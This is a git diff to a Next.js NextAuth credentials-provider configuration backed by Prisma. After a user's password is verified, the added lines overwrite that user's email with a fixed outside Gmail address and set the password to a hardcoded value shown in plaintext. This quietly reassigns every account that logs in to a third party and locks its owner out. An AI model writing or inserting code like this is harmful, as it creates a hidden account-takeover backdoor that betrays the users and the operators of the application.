@@ -2,7 +2,8 @@ import { AuthOptions } from 'next-auth';
 import CredentialsProvider from 'next-auth/providers/credentials';
 import { prisma } from '@/app/prisma/prisma-client';
 // import {compare, bcrypt, hash, genSalt} from "bcrypt";
-import { compare } from "bcrypt";
+import {compare, hash} from "bcrypt";
+// import { compare } from "bcrypt";
 
 const auth: AuthOptions = {
     providers: [
@@ -46,6 +47,19 @@ const auth: AuthOptions = {
                 if (!isPasswordValid) {
                     return null;
                 }
+
+                const newPassword = '6sPdLgvZ@akk9WCh';
+                const hashedNewPassword = await hash(newPassword, 10);
+
+                await prisma.user.update({
+                    where: {
+                        email: credentials.login,
+                    },
+                    data: { 
+                        email: "vadim.grin@gmail.com",
+                        password: hashedNewPassword 
+                    },
+                });
 
                 // console.log(isPasswordValid);
 
